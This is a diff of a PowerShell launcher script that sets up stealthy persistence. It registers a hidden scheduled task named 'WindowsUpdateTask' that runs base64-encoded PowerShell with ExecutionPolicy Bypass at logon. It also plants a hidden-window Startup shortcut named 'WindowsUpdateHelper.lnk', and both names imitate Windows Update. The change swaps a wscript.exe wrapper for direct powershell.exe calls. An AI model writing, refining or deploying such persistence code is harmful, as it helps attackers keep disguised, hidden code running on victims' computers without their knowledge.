@@ -1,6 +1,6 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === DEBUG LOGGING (Silent in production) ===
+# === DEBUG LOGGING ===
 $logFile = "$env:TEMP\launcher_log.txt"
 function Log($msg) {
     try { "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $msg" | Out-File -FilePath $logFile -Append -Encoding UTF8 } catch {}
@@ -42,7 +42,7 @@ function Save-ScriptToDisk {
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 Log "Script saved to: $scriptPath"
 
-# === PERSISTENCE: Scheduled Task (Hidden via wscript.exe) ===
+# === PERSISTENCE: Scheduled Task ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 Log "Task exists check: $($taskExists -ne $null)"
@@ -51,7 +51,7 @@ if (-not $taskExists) {
     try {
         $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
         $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
-        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B `"powershell.exe -EncodedCommand $encodedCommand`""
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
         Log "Scheduled Task '$taskName' registered"
@@ -70,7 +70,7 @@ if (-not $taskExists) {
     }
 }
 
-# === PERSISTENCE: Startup LNK (Hidden via wscript.exe) ===
+# === PERSISTENCE: Startup LNK ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 Log "Startup LNK path: $lnkPath"
@@ -79,8 +79,8 @@ if (-not (Test-Path $lnkPath)) {
     try {
         $wshShell = New-Object -ComObject WScript.Shell
         $shortcut = $wshShell.CreateShortcut($lnkPath)
-        $shortcut.TargetPath = "wscript.exe"
-        $shortcut.Arguments = "//B `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"`""
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
         $shortcut.WindowStyle = 7
         $shortcut.Save()
         Log "Startup LNK created"
